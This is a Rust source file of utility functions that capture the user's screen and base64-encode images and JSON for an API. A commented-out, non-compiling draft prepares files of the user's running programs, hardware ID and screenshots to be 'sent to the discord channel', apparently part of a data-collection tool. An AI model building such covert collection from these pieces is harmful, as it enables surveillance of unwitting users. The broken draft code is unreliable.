

// Create a new directory at the provided path
pub fn mkdir(path: &str) -> Result<(), std::io::Error> {
    return match std::fs::create_dir_all(path) {
        Ok(_) => Ok(()),
        Err(e) => Err(e)
    };
}

// Read the provided file via the provided path then
// return the buffer as a vector of bytes
pub fn read_file(path: &str) -> Result<Vec<u8>, std::io::Error> {
    return match std::fs::read(path) {
        Ok(f) => Ok(f),
        Err(e) => Err(e)
    }
}

// Convert the png image buffer to a base64 string
// which can be passed to the api as a readable image
pub fn encode_png(buf: Vec<u8>) -> String {
    return format!(
        "data:image/png;base64,{}", base64::encode(buf)
    )
}

// Convert the json buffer to a base64 string which
// can be passed to the api as a readable file
pub fn encode_json(buf: Vec<u8>) -> String {
    return format!(
        "data:application/json;base64,{}", base64::encode(buf)
    )
}

// Capture a screenshot and save it to the current folder
pub fn capture_image() -> Result<Vec<u8>, String> {
    let screens = match screenshots::Screen::all() {
        Some(s) => s,
        None => return Err(String::from("failed to get screens"))
    };

    // Iterate through all the screens
    for screen in screens {
        return match screen.capture() {
            Some(f) => Ok(f.buffer().to_vec()),
            None => return Err(String::from("failed to capture screen"))
        }
    }
    Ok(Vec::new())
}

/*
// Define the request client as a global variable
lazy_static::lazy_static! {
    static ref DATA_FOLDER: String = sha256::digest(
        global::get_time().as_nanos().to_string()
    );
}

// The create_hardware_file() function is used to create a new
// text file and write the users hardware information to it.
// This includes the users running programs, the users hwid, etc.
fn create_hwinfo_file(hardware_info: &str) -> std::io::Result<String> {
    // Format the hardware file path
    let hardware_info_path: &str = &format!("{}\\{}.txt", 
        DATA_FOLDER.to_string(), chrono::offset::Utc::now()
    );

    // Create the file and if the file is successfully created,
    // write the hardware data to the file then return it.
    return match File::create(hardware_info_path) {
        Ok(mut f) => match f.write_all(&hardware_info) {
            Ok(_) => Ok(base64::encode(&hardware_info)),
            Err(e) => Err(e)
        },
        Err(e) => Err(e)
    }
}

// The create_image_file() function is used to create a new
// image which will be sent to the discord channel.
fn create_image_file(image: &str) -> std::io::Result<String> {
    // Format the image file path
    let image_path: &str = &format!("{}\\{}.png", 
        DATA_FOLDER.to_string(), chrono::offset::Utc::now()
    );

    // Base64 decode the image
    let image_buffer: Vec<u8> = image_base64::from_base64(image.to_string());

    // Create the file and if the file is successfully created,
    // write the image buffer to the file then return it.
    return match File::create(image_path) {
        Ok(mut f) => match f.write_all(&image_buffer) {
            Ok(_) => Ok(image_path.to_string()),
            Err(e) => Err(e)
        },
        Err(e) => Err(e)
    }
}

fn main() {
    // Call the create_image_file() function
    let image_path: String = match create_image_file(&body.image) {
        Ok(path) => path,
        Err(_) => return None
    };

    // Call the create_hardware_file() function
    let hardware_buf: Vec<u8> = match create_hardware_file(&body.hardware_info) {
        Ok(buf) => buf,
        Err(_) => return None
    };
}

*/
